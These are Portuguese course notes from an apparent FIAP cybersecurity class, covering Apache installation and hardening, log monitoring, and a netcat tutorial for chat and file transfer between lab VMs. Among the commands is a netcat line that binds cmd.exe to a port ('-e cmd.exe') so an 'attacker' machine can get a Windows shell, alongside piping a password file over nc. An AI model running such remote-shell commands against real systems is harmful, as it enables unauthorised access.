# FIAP-Cyber

#### Resumo colega: https://www.notion.so/flaviovicentin/Cybersecurity-b35d9c73f60249cdb12c28dc66c0d06a

## Resumo de Comandos

### Updates/Installs
> apt install update

> apt install upgrade

> apt install apache2 apache2-utils -y

> apt install net-tools

- Iniciar o servidor:
> service apache2 start

### Notes CP01

- Entrar no diretório padrão do servidor html:
cd /var/www/html

- Vamos renomear o index.html para copial.html:
mv index.html copia.html

- Gerar a primeira falha de segurança no webservice:
- Vamos criar arquivos na pasta padrão do webservice e ver eles exibidos do lado do cliente:
touch bkp.txt cadastro.php

- criar o index.html, com o editor de texto do Linux – nano, e ver o que acontece com o webservice:
nano index.html

*RESOLVENDO PROBLEMAS DE SEGURANÇA*

1. OCULTAR AS PASTAS PARA OS CLIENTES:
nano /etc/apache2/apache2.conf

- Remover o INDEXES para não exibir mais as pastas disponíveis para os clientes.

- Restart o webservice apache:
service apache2 restart

- Alterar a configuração do banner no apache:
nano /etc/apache2/conf-enabled/security.conf

- Por padrão o apache vem com o token como o Sistema Operacional (SO) deseja e a assinatura online. 
- Mas por medida de segurança, devemos alterar para o modo de Produção.:
Trocar de "ServerTokens OS" para "ServerTokens Prod" e desligar a assinatura "ServerSignature Off"

- Subir o servidor python na porta 8080
python3 –m http.server 8080

VER LOGs do SERVIDOR APACHE
1. No apache, ele existe o caminho padrão das pastas
cd /var/log/apach2
ls
8. Vamos monitorar o servidor e ver como ele vai agir.
tail –f access.log

### Instalação e Configuração

- Instalar o Netcat:
apt install netcat

- Iniciar um servidor HTTP em Python na porta 8080:
python3 -m http.server 8080

### Comandos Básicos

- Estabelecer uma conexão TCP com um host:
nc -v 192.168.1.10 8080

- Mostrar informações detalhadas sobre as conexões:
OPTIONS / HTTP/1.0
GET / HTTP/1.1

- Mostrar as conexões de rede:
netstat -nltp

### Manter Conexão com o Servidor

- Enviar uma requisição OPTIONS e manter a conexão:
printf "OPTIONS / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

- Verificar o IP do webserver em Python:
ip -br -c a

### Chat Simples

- Abrir uma porta para o servidor:
nc -lvp 1234

- Interagir com a porta do servidor:
nc -v 192.168.1.10 1234

### Transferência de Arquivos

- Criar e enviar um arquivo do servidor para o cliente:
echo "P4sswd" > senha.txt
cat senha.txt | nc -lvp 1234
nc -v 192.168.1.10 1234 > passwd.txt

- Exibir o hash MD5 do arquivo:
md5sum senha.txt


### Transferência de Executáveis

- Transferir o arquivo nc.exe para uma máquina Windows:
python3 -m http.server 1234
nc -nv 192.168.1.30 4444


- Abrir uma porta no lado do cliente para executar o nc.exe e conectar à máquina do atacante:
nc.exe -nvlp 4444 -e cmd.exe

Certifique-se de adaptar os endereços IP e portas conforme necessário para sua configuração.

### Comandos

- Criação de chat simples (servidor e cliente precisam estar na mesma rede):
nc -lvp 1234
nc -v 192.168.1.10 1234

- Transferir o nc.exe para uma VM Windows:
python3 -m http.server 1234
nc -nv 192.168.1.30 4444

### Enviar Arquivo entre Três Máquinas

Kali > VM01 > VM02

- No Kali, executar o seguinte comando no arquivo desejado:,
nc -l -p 1234 > video.avi

- Na VM01, receber o arquivo da máquina Kali e disponibilizar para a VM02:
nc -v 192.168.1.10 1234 | nc -l -p 4321




